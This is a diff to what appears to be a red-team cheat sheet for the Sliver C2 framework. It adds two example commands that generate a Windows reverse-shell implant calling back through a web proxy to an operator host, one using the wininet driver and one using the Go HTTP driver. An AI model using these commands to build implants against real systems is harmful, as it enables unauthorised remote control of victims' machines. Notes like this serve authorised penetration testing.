@@ -298,15 +298,22 @@ Sub Commands:
 jeff@kali:~/Documents/Tools/SLiver-C2$ sudo chmod 777 SliverRevShell1.exe 
 
 
-Note - Command to generate an implant that goes through an NTLM/Kerberos proxy
--------------------------------------------------------------------------------
-> generate --arch amd64 -f exe --http <IP or domain.com> --save /temp/SliverRevShell.exe --os Windows --driver wininet --proxy <IP> 
-           --proxy-username <login> --proxy-password <password>
+---------------------------------------------------------------------------
+Note - Commands to generate a SLIVER implant that goes through a Web proxy
+---------------------------------------------------------------------------
 
-# driver - Manually specify the HTTP driver (string). On windows this value can be set to wininet to use the wininet HTTP library for C2 communication.
-# proxy  - Manually specify HTTP proxy. The format should be one that is accepted by the Go HTTP library.
-# proxy-username - Specify a proxy username. Only valid with the Go HTTP driver.
-# proxy-password - Specify the proxy password. Only valid with the Go HTTP driver.
+Example 1 - Command using the "wininet" driver 
+> I tested it on a target Windows machine that was configured with an unauthenticated HTTP SQUID proxy set as the default Web proxy server
+> generate --arch amd64 -f exe --save /temp/SliverRevShell.exe --os Windows --http https://<IP or domain.com>?driver=wininet 
+
+Example 2 - Command using the "Go HTTP" driver
+> I tested it on a target Windows machine that was configured with no Web proxy server
+> generate --arch amd64 -f exe --save /temp/SliverRevShell.exe --os Windows --http https://<IP or domain.com>?proxy=http://<proxy-IP>:<proxy-port>
+
+URLs:
+- https://github.com/BishopFox/sliver/wiki/C2-Advanced-Options
+- https://github.com/BishopFox/sliver/issues/790
+- https://pkg.go.dev/net/http#ProxyURL
 
 
 ====================================================================================================================================================
